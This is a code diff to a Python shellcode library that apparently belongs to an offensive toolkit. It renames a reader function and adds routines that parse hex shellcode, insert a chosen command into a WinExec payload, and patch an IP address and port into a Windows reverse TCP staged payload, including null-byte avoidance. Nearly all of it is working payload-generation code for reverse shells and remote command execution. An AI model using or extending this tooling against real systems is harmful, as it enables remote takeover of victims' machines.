@@ -1,7 +1,7 @@
 '''
 A Library to work around shellcodes.
 -class SHELLCODE
--LibShellcode.SHELLCODE ReadSHELLCODE(inputFile: str)
+-LibShellcode.SHELLCODE ReadSHELLCODEASM(inputFile: str)
 -LibShellcode.SHELLCODE GenerateCDRTShell(Ip: str, Port: str)
 -LibShellcode.SHELLCODE GenerateCDRTS()
 -LibShellcode.SHELLCODE GenerateCDRTTShell()
@@ -9,6 +9,7 @@ A Library to work around shellcodes.
 '''
 from SRC.Core import Globals
 from SRC.Libs import LibDebug
+from SRC.Libs import LibByteEditor
 import sys
 import binascii
 import os
@@ -33,7 +34,7 @@ class SHELLCODE:
             return shellcode
 
 
-def ReadSHELLCODE(inputFile: str):
+def ReadSHELLCODEASM(inputFile: str):
     '''
     Read one ASM file and return a SHELLCODE object
     -return SHELLCODE
@@ -103,7 +104,7 @@ def GenerateCDRTShell(Ip: str, Port: str):
     File = open("shellcode.asm", "w+")
     File.write(Content)
     File.close()
-    return ReadSHELLCODE("shellcode.asm")
+    return ReadSHELLCODEASM("shellcode.asm")
 
 
 def GenerateCDRTS():
@@ -111,7 +112,7 @@ def GenerateCDRTS():
     Generate a Dynamic Reverse TCP Staged shellcode.
     -return string
     '''
-    return ReadSHELLCODE("ASM/ShellCodes/Windows/" + Globals.Env.ARCH + "/Custom_Dynamic_ReverseTCP_Staged.asm")
+    return ReadSHELLCODEASM("ASM/ShellCodes/Windows/" + Globals.Env.ARCH + "/Custom_Dynamic_ReverseTCP_Staged.asm")
 
 
 def GenerateCDRTTShell():
@@ -119,7 +120,7 @@ def GenerateCDRTTShell():
     Generate a Dynamic Reverse TCP Threaded Shell shellcode.
     -return string
     '''
-    return ReadSHELLCODE("ASM/ShellCodes/Windows/" + Globals.Env.ARCH + "/Custom_Dynamic_ReverseTCP_Threaded_Shell.asm")
+    return ReadSHELLCODEASM("ASM/ShellCodes/Windows/" + Globals.Env.ARCH + "/Custom_Dynamic_ReverseTCP_Threaded_Shell.asm")
 
 
 def GenerateWinExec(command: str):
@@ -150,4 +151,52 @@ def GenerateWinExec(command: str):
     File = open("shellcode.asm", "w+")
     File.write(Content)
     File.close()
-    return ReadSHELLCODE("shellcode.asm")
+    return ReadSHELLCODEASM("shellcode.asm")
+
+def ReadSHELLCODE(inputFile: str):
+    shellcode = SHELLCODE()
+    with open(inputFile, 'r') as fc:
+        unparsed_shellcode = fc.read()
+    for i in range(0,len(unparsed_shellcode),2):
+        shellcode.opcodes.append(unparsed_shellcode[i:i+2])
+    BadEnd = True
+    while BadEnd:
+        if shellcode.opcodes[len(shellcode.opcodes)-1] == "0000" or shellcode.opcodes[len(shellcode.opcodes)-1] == "00" or shellcode.opcodes[len(shellcode.opcodes)-1] == "ff" or shellcode.opcodes[len(shellcode.opcodes)-1] == "ff00" or shellcode.opcodes[len(shellcode.opcodes)-1] == "00ff" or shellcode.opcodes[len(shellcode.opcodes)-1] == "ffff":
+            shellcode.opcodes.pop(len(shellcode.opcodes)-1)
+        else:
+            BadEnd = False
+    return shellcode
+
+def EditWinexec(shellcode, command):
+    command = "\"" + command + "\""
+    unparsed_HexCommand = LibDebug.StringToHex(LibDebug.RevertString(command))
+    while len(unparsed_HexCommand) % 8 != 0:
+        unparsed_HexCommand = "20" + unparsed_HexCommand
+    HexCommand = ""
+    for i in range(0,len(unparsed_HexCommand),8):
+        HexCommand += "68" + LibByteEditor.RevertBytes(unparsed_HexCommand[i:i+8])
+    unparsed_shellcode = shellcode.GetShellcode().replace("HYPNOS", HexCommand)
+    shellcode = SHELLCODE()
+    for i in range(0,len(unparsed_shellcode),2):
+        shellcode.opcodes.append(unparsed_shellcode[i:i+2])
+    return shellcode
+
+def EditCDRTSX32(shellcode, Ip, Port):
+    HexIp = LibByteEditor.RevertBytes(LibDebug.IpToHex(Ip))
+    HexPort = LibByteEditor.RevertBytes(LibDebug.PortToHex(Port))
+    NullByteTrigger = False
+    for i in range(0, len(HexIp), 2):
+        if HexIp[i:i+2] == "00":
+            NullByteTrigger = True
+            break
+    if NullByteTrigger:
+            HexIp = str(hex(int("ffffffff", 16) - int(HexIp, 16)))[2:]
+            HexPort = str(hex(int("ffff", 16) - int(HexPort, 16)))[2:]
+            unparsed_shellcode = shellcode.GetShellcode().replace('HYPNOS', "31dbbbffffffff81eb" + HexIp + "5331dbbbffffffff6681eb" + HexPort + "6653")
+    else:
+        for i in range(0, len(shellcode.GetShellcode())):
+            unparsed_shellcode = shellcode.GetShellcode().replace('HYPNOS', "68" + HexIp + "6668" + HexPort)
+    shellcode = SHELLCODE()
+    for i in range(0,len(unparsed_shellcode),2):
+        shellcode.opcodes.append(unparsed_shellcode[i:i+2])
+    return shellcode
